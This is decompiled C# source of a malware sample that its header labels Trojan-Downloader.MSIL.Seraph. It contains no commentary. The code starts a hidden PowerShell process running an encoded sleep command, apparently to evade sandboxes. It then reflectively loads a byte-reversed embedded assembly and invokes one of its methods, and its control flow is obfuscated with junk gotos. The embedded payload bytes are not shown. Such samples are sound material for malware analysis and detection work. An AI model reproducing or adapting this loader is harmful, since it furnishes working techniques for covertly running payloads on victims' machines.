// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Vavzrxn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3FCA96E-A561-4FCC-246E-66A2F2BAA5FB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\Trojan-Downloader.MSIL.Seraph.allu-3fc8d5c41f950cbf8a4becb6390221bbbb8c28a52fbc68b55296ccf6aaec7a45.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;

public static class \u0002
{
  [STAThread]
  public static void \u0002()
  {
    if (false)
      return;
    \u0002.\u0003();
  }

  private static void \u0003()
  {
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      FileName = "powershell",
      Arguments = "-enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAwADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAwADsA"
    }).WaitForExit();
    MethodInfo[] methodInfoArray1 = \u0002.\u0002();
    if (true)
      goto label_4;
label_1:
    MethodInfo[] methodInfoArray2;
    int num = methodInfoArray2.Length != 0 ? 1 : 0;
    if (true)
      goto label_5;
label_2:
    bool flag;
    if (!flag)
      return;
    MethodInfo[] methodInfoArray3 = methodInfoArray2;
    if (true)
      goto label_8;
label_7:
    MethodInfo[] methodInfoArray4;
    for (int index = 0; index < methodInfoArray4.Length; ++index)
    {
      MethodInfo methodInfo = methodInfoArray4[index];
      if (methodInfo.Name == "Lwdkxncvmliyn")
        methodInfo.Invoke((object) null, (object[]) null);
    }
    return;
label_8:
    methodInfoArray4 = methodInfoArray3;
    goto label_7;
label_5:
    flag = num != 0;
    goto label_2;
label_4:
    methodInfoArray2 = methodInfoArray1;
    goto label_1;
  }

  private static byte[] \u0002()
  {
    byte[] numArray1 = \u0003.\u0002();
    if (true)
      goto label_3;
label_1:
    byte[] numArray2;
    byte[] numArray3 = numArray2;
    if (true)
      goto label_4;
label_2:
    byte[] numArray4;
    return numArray4;
label_4:
    numArray4 = numArray3;
    goto label_2;
label_3:
    numArray2 = numArray1;
    goto label_1;
  }

  private static MethodInfo[] \u0002()
  {
    List<MethodInfo> methodInfoList1 = new List<MethodInfo>();
    if (true)
      goto label_3;
label_1:
    List<Type> typeList1 = new List<Type>();
    if (true)
      goto label_4;
label_2:
    List<Type> typeList2;
    typeList2.AddRange((IEnumerable<Type>) \u0002.\u0002().GetExportedTypes());
    List<Type>.Enumerator enumerator1 = typeList2.GetEnumerator();
    List<Type>.Enumerator enumerator2;
    if (true)
      enumerator2 = enumerator1;
    List<MethodInfo> methodInfoList2;
    try
    {
      while (enumerator2.MoveNext())
      {
        Type current = enumerator2.Current;
        methodInfoList2.AddRange((IEnumerable<MethodInfo>) current.GetMethods());
      }
    }
    finally
    {
      enumerator2.Dispose();
    }
    return methodInfoList2.ToArray();
label_4:
    typeList2 = typeList1;
    goto label_2;
label_3:
    methodInfoList2 = methodInfoList1;
    goto label_1;
  }

  private static Assembly \u0002()
  {
    Assembly assembly1 = (Assembly) typeof (Assembly).GetMethod("Load", new Type[1]
    {
      typeof (byte[])
    }).Invoke((object) null, new object[1]
    {
      (object) ((IEnumerable<byte>) \u0002.\u0002()).Reverse<byte>().ToArray<byte>()
    });
    if (true)
      goto label_3;
label_1:
    Assembly assembly2;
    Assembly assembly3 = assembly2;
    if (true)
      goto label_4;
label_2:
    Assembly assembly4;
    return assembly4;
label_4:
    assembly4 = assembly3;
    goto label_2;
label_3:
    assembly2 = assembly1;
    goto label_1;
  }
}
